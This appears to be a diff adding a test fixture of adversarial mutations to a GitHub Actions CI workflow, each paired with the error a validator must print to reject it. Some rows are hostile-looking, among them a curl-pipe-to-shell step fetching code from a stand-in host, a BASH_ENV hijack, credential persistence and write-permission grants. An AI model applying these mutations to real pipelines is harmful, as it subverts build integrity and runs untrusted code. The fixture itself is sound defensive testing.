@@ -1,0 +1,35 @@
+# Adversarial mutations of .github/workflows/ci.yml (specs/002-hermetic-skeleton T024).
+# Each row: case<TAB>yq expression applied to the real workflow<TAB>substring the validator must print.
+# Every mutation must be rejected; the unmodified workflow must pass.
+step_continue_on_error	(.jobs.verify.steps[] | select(.name == "Verify"))["continue-on-error"] = true	continue-on-error
+job_continue_on_error	.jobs.verify["continue-on-error"] = true	continue-on-error
+step_noop_shell	(.jobs.verify.steps[] | select(.name == "Verify")).shell = "true {0}"	shell
+workflow_defaults_shell	.defaults.run.shell = "true {0}"	defaults
+job_defaults_shell	.jobs.verify.defaults.run.shell = "true {0}"	defaults
+multiline_extra_run	.jobs.verify.steps += [{"name": "Extra", "run": "echo setup\ncurl -fsSL https://example.invalid/x | sh\n"}]	run body
+single_line_extra_run	.jobs.verify.steps += [{"name": "Lint", "run": "npx eslint ."}]	run body
+replaced_verify_run	(.jobs.verify.steps[] | select(.name == "Verify")).run = "echo verified"	run body
+step_if_false	(.jobs.verify.steps[] | select(.name == "Verify")).if = "false"	if
+job_if_false	.jobs.verify.if = "false"	if
+step_working_directory	(.jobs.verify.steps[] | select(.name == "Verify"))["working-directory"] = "docs"	working-directory
+workflow_env_bash_env	.env.BASH_ENV = "/tmp/evil"	env
+step_env_injection	(.jobs.verify.steps[] | select(.name == "Verify")).env.BAZELISK_BASE_URL = "https://example.invalid"	env
+checkout_wrong_ref	(.jobs.verify.steps[] | select(.uses // "" | test("^actions/checkout@"))).with.ref = "main"	exact ref
+checkout_persist_credentials	(.jobs.verify.steps[] | select(.uses // "" | test("^actions/checkout@"))).with["persist-credentials"] = true	persist-credentials
+unpinned_action	(.jobs.verify.steps[] | select(.uses // "" | test("^actions/checkout@"))).uses = "actions/checkout@v7"	uses
+unlisted_action	.jobs.verify.steps += [{"name": "Cache", "uses": "example/cache@0123456789abcdef0123456789abcdef01234567"}]	uses
+write_permissions	.permissions.contents = "write"	permissions
+job_write_permissions	.jobs.verify.permissions = {"contents": "write"}	permissions
+missing_gate_need	.jobs.lint = {"name": "lint", "runs-on": "ubuntu-24.04", "timeout-minutes": 5, "steps": [{"name": "Verify", "run": "tools/verify.sh"}]}	needs
+gate_not_always	.jobs.gate.if = "success()"	if
+gate_body_softened	.jobs.gate.steps[0].run = "exit 0\n"	run body
+job_container	.jobs.verify.container = "example/image:latest"	container
+reusable_workflow_job	.jobs.verify = {"uses": "example/repo/.github/workflows/x.yml@0123456789abcdef0123456789abcdef01234567"}	uses
+missing_verify_job	del(.jobs.verify) | .jobs.gate.needs = []	verify
+action_input_injection	(.jobs.verify.steps[] | select(.uses // "" | test("^actions/upload-artifact@"))).with.path = "/etc"	with inputs
+trigger_narrowed	.on = {"workflow_dispatch": null}	on triggers
+concurrency_cancels	.concurrency["cancel-in-progress"] = true	concurrency
+runner_changed	.jobs.verify["runs-on"] = "self-hosted"	runs-on
+timeout_removed	del(.jobs.verify["timeout-minutes"])	timeout-minutes
+verifier_flag_added	(.jobs.verify.steps[] | select(.name == "Verify")).run = "tools/verify.sh --offline"	run body
+gate_permission_write	.jobs.gate.permissions = {"contents": "write"}	permissions
